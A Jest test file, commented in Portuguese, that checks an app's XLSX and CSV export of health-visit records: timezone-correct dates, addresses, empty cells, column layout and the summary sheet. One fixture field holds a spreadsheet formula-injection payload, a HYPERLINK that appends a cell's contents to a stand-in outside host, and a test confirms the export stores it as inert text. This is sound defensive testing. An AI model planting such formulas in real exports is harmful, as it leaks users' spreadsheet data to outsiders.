/**
 * Planilha de verdade, no fuso de quem usa o aplicativo.
 *
 * O teste do exportService mocka o `xlsx` e usava data com hora, então nunca
 * abriu o arquivo gerado nem viu a data como o aplicativo grava: só o dia,
 * `2026-10-13`. Lida como meia-noite UTC, no Brasil ela vira dia 12 às 21h, e
 * era isso que saía na coluna Data. Aqui o `xlsx` é o real e o arquivo é lido
 * de volta, no fuso de São Paulo fixado pelo globalSetup (jest.fuso.js).
 *
 * A planilha que motivou a segunda rodada destes testes saiu de um aparelho
 * com o endereço como UUID da residência, o paciente como `'-` e todo campo
 * vazio com um apóstrofo aparente.
 */
const escritas: { nome: string; conteudo: unknown }[] = [];

jest.mock('expo-file-system', () => {
  class FileFake {
    uri: string;
    nome: string;
    exists = false;
    constructor(_pasta: unknown, nome: string) {
      this.nome = nome;
      this.uri = `file:///documents/${nome}`;
    }
    create() {}
    delete() {}
    write(conteudo: unknown) {
      escritas.push({ nome: this.nome, conteudo });
    }
  }
  return { File: FileFake, Paths: { document: 'file:///documents/' } };
});

jest.mock('expo-sharing', () => ({
  isAvailableAsync: jest.fn().mockResolvedValue(true),
  shareAsync: jest.fn().mockResolvedValue(undefined),
}));

import { read, utils } from 'xlsx';
import { exportService } from '../exportService';
import { VisitaListada, StatusVisita, StatusSync } from '../../types';

const visita: VisitaListada = {
  id: 'v1',
  agente_id: 'a1',
  residencia_id: '6f1c2d3e-0000-4000-8000-000000000001',
  data_visita: '2026-10-13',
  status: StatusVisita.REALIZADA,
  queixas: '=HYPERLINK("http://fora.example/"&A1,"clique")',
  observacoes: 'Pressão controlada',
  precisa_agendamento: true,
  especialidade_agendamento: 'Cardiologia',
  created_at: '2026-10-13T13:45:00.000Z',
  updated_at: '2026-10-13T13:45:00.000Z',
  status_sync: StatusSync.SINCRONIZADO,
  logradouro: 'Rua das Flores',
  numero: '120',
  bairro: 'Centro',
  morador_nome: 'Maria Aparecida',
};

/** Visita sem paciente, sem queixa e sem observação: os campos vazios. */
const visitaVazia: VisitaListada = {
  ...visita,
  id: 'v0',
  data_visita: '2026-10-02',
  status: StatusVisita.NAO_ENCONTRADO,
  queixas: undefined,
  observacoes: undefined,
  precisa_agendamento: false,
  especialidade_agendamento: undefined,
  morador_nome: undefined,
  created_at: '2026-10-02T12:00:00.000Z',
};

async function exportar(visitas: VisitaListada[]) {
  await exportService.exportarVisitas(
    { visitas, periodo: 'mes', data_referencia: '2026-10-31' },
    'xlsx'
  );
  // `cellNF` e `cellStyles` fazem a leitura devolver o formato de número e a
  // largura das colunas, que por padrão o leitor descarta.
  const livro = read(escritas[0].conteudo as Uint8Array, {
    type: 'array', cellNF: true, cellStyles: true,
  });
  const aba = livro.Sheets[livro.SheetNames[0]];
  return {
    livro,
    aba,
    linhas: utils.sheet_to_json<Record<string, string>>(aba, { raw: false }),
  };
}

beforeEach(() => {
  escritas.length = 0;
});

describe('planilha de visitas exportada', () => {
  it('confere o fuso do teste', () => {
    // Sem isto o teste passaria em máquina UTC mesmo com o defeito de volta.
    expect(new Date('2026-10-13').getDate()).toBe(12);
  });

  it('gera um .xlsx com a aba do período e a de resumo', async () => {
    const { livro, linhas } = await exportar([visita]);

    expect(escritas[0].nome).toBe('visitas_mes_2026-10-31.xlsx');
    expect(livro.SheetNames).toEqual(['Visitas - Mensal', 'Resumo']);
    expect(linhas).toHaveLength(1);
  });

  it('mostra o dia da visita, e não o anterior', async () => {
    const [linha] = (await exportar([visita])).linhas;
    expect(linha['Data']).toBe('13/10/2026');
  });

  it('grava as datas como data, para o Excel ordenar pelo calendário', async () => {
    const { aba } = await exportar([visita]);

    expect(aba['A2'].t).toBe('n');
    expect(aba['A2'].z).toBe('dd/mm/yyyy');
    expect(aba['B2'].t).toBe('n');
  });

  it('a hora vem do registro, e não de um 21:00 inventado pelo fuso', async () => {
    const [linha] = (await exportar([visita])).linhas;

    expect(linha['Horário']).toBeUndefined();
    expect(linha['Registrado em']).toBe('13/10/2026 10:45');
  });

  it('mostra o endereço e o paciente, e não o id da residência', async () => {
    const [linha] = (await exportar([visita])).linhas;

    expect(linha['Endereço']).toBe('Rua das Flores, 120');
    expect(linha['Bairro']).toBe('Centro');
    expect(linha['Paciente']).toBe('Maria Aparecida');
    expect(JSON.stringify(linha)).not.toContain(visita.residencia_id);
  });

  it('campo vazio fica vazio, sem traço nem apóstrofo', async () => {
    const [linha] = (await exportar([visitaVazia])).linhas;

    expect(linha['Paciente']).toBeUndefined();
    expect(linha['Queixas']).toBeUndefined();
    expect(JSON.stringify(linha)).not.toContain("'");
  });

  it('texto que parece fórmula entra como texto, sem virar fórmula', async () => {
    const { aba, linhas } = await exportar([visita]);
    const queixas = aba['H2'];

    expect(queixas.t).toBe('s');
    expect(queixas.f).toBeUndefined();
    expect(linhas[0]['Queixas']).toBe(visita.queixas);
  });

  it('leva os demais campos', async () => {
    const [linha] = (await exportar([visita])).linhas;

    expect(linha['Status']).toBe('Realizada');
    expect(linha['Agendamento']).toBe('Sim');
    expect(linha['Especialidade']).toBe('Cardiologia');
    expect(linha['Observações']).toBe('Pressão controlada');
  });

  it('ordena do dia mais antigo para o mais novo', async () => {
    const { linhas } = await exportar([visita, visitaVazia]);
    expect(linhas.map((l) => l['Data'])).toEqual(['02/10/2026', '13/10/2026']);
  });

  it('tem filtro no cabeçalho e largura em todas as colunas', async () => {
    const { aba } = await exportar([visita, visitaVazia]);

    expect(aba['!autofilter']?.ref).toBe('A1:K3');
    const colunas = aba['!cols'] ?? [];
    expect(colunas).toHaveLength(11);
    for (const c of colunas) expect(c.wch).toBeGreaterThanOrEqual(10);
  });

  it('o resumo conta as visitas por status', async () => {
    const { livro } = await exportar([visita, visitaVazia]);
    const resumo = utils.sheet_to_json<string[]>(livro.Sheets['Resumo'], { header: 1, raw: false });
    const valor = (rotulo: string) => resumo.find((l) => l[0] === rotulo)?.[1];

    expect(valor('Período')).toBe('Mensal');
    expect(valor('Primeira visita')).toBe('02/10/2026');
    expect(valor('Última visita')).toBe('13/10/2026');
    expect(valor('Total de visitas')).toBe('2');
    expect(valor('Realizada')).toBe('1');
    expect(valor('Não encontrado')).toBe('1');
    expect(valor('Precisam de agendamento')).toBe('1');
  });
});

describe('CSV exportado', () => {
  it('mesmas colunas, sem UUID e com o vazio vazio', async () => {
    await exportService.exportarVisitas(
      { visitas: [visitaVazia], periodo: 'dia', data_referencia: '2026-10-02' },
      'csv'
    );
    const [cabecalho, linha] = (escritas[0].conteudo as string).slice(1).split('\n');

    expect(cabecalho.split(';')).toEqual([
      'Data', 'Registrado em', 'Endereço', 'Bairro', 'Paciente', 'Status',
      'Motivo', 'Queixas', 'Observações', 'Agendamento', 'Especialidade',
    ]);
    expect(linha).toContain('"Rua das Flores, 120"');
    expect(linha).not.toContain(visita.residencia_id);
    expect(linha).not.toContain("'");
  });
});
